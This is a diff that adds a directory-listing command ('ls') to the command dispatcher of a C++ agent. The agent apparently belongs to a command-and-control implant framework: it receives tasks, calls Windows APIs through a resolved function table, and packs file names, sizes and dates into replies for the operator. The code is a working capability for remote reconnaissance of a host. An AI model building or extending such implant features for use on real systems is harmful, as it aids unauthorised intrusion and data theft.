@@ -32,6 +32,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_DOWNLOAD_STATE:
 			this->CmdDownloadState(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_LS:
+			this->CmdLs(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_PROFILE:
 			this->CmdProfile(CommandId, inPacker, outPacker); break;
 
@@ -155,6 +158,69 @@ void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outP
 	}
 }
 
+void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pathSize = 0;
+	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
+	ULONG taskId   = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+	outPacker->Pack32(commandId);
+
+	CHAR  fullpath[MAX_PATH];
+	DWORD fullpathSize = ApiWin->GetFullPathNameA(path, MAX_PATH, fullpath, NULL);
+	if (fullpathSize+2 > MAX_PATH || fullpathSize == 0) {
+		outPacker->Pack8(FALSE);
+		outPacker->Pack32(TEB->LastErrorValue);
+		return;
+	}
+
+	fullpath[fullpathSize]   = '\\';
+	fullpath[++fullpathSize] = '*';
+	fullpath[++fullpathSize] = 0;
+
+	WIN32_FIND_DATAA findData = { 0 };
+	HANDLE File = ApiWin->FindFirstFileA(fullpath, &findData);
+	if ( File != INVALID_HANDLE_VALUE ) {
+		outPacker->Pack8(TRUE);
+		outPacker->PackStringA(fullpath);
+
+		ULONG count = 0;
+		ULONG indexCount = outPacker->GetDataSize();
+		outPacker->Pack32(0);
+
+		do {
+			BOOL isDir = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY;
+			
+			if( isDir && StrLenA(findData.cFileName) == 1 && findData.cFileName[0] == 0x2e )
+				continue;
+			if (isDir && StrLenA(findData.cFileName) == 2 && findData.cFileName[0] == 0x2e && findData.cFileName[1] == 0x2e)
+				continue;
+			
+			ULONG64 size = 0;
+			((ULONG*)&size)[1] = findData.nFileSizeHigh;
+			((ULONG*)&size)[0] = findData.nFileSizeLow;
+
+			ULONG writeDate = FileTimeToUnixTimestamp(findData.ftLastWriteTime);
+
+			outPacker->Pack8(isDir);
+			outPacker->Pack64(size);
+			outPacker->Pack32(writeDate);
+			outPacker->PackStringA(findData.cFileName);
+
+			count++;
+
+		} while (ApiWin->FindNextFileA(File, &findData));
+		ApiWin->FindClose(File);
+		outPacker->Set32(indexCount, count);
+	}
+	else {
+		outPacker->Pack8(FALSE);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
+
+}
+
 void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG subcommand = inPacker->Unpack32();
@@ -252,8 +318,6 @@ void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 	agent->memorysaver->RemoveMemoryData(memoryId);
 }
-
-
 
 void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
